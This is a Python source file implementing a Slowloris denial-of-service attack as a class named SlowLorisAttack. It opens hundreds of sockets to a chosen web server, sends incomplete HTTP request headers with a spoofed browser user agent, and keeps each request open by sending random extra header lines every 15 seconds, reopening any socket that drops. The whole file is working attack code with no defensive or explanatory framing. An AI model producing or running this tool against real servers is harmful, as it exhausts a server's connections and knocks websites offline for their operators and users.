import socket
import random
import time
import threading

class SlowLorisAttack:
    def __init__(self, host, port=80, sockets_count=500):
        self.host = host
        self.port = port
        self.sockets = []
        self.sock_count = sockets_count
        self.running = False

    def _init_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.host, self.port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {self.host}\r\n".encode("utf-8"))
            s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en;q=0.5\r\n".encode("utf-8"))
            return s
        except Exception:
            return None

    def _keep_alive(self, s):
        try:
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            return True
        except:
            return False

    def start(self):
        self.running = True
        for _ in range(self.sock_count):
            try:
                s = self._init_socket()
                if s:
                    self.sockets.append(s)
                time.sleep(0.01)
            except:
                pass
        while self.running:
            for s in list(self.sockets):
                if not self._keep_alive(s):
                    self.sockets.remove(s)
                    new_s = self._init_socket()
                    if new_s:
                        self.sockets.append(new_s)
            time.sleep(15)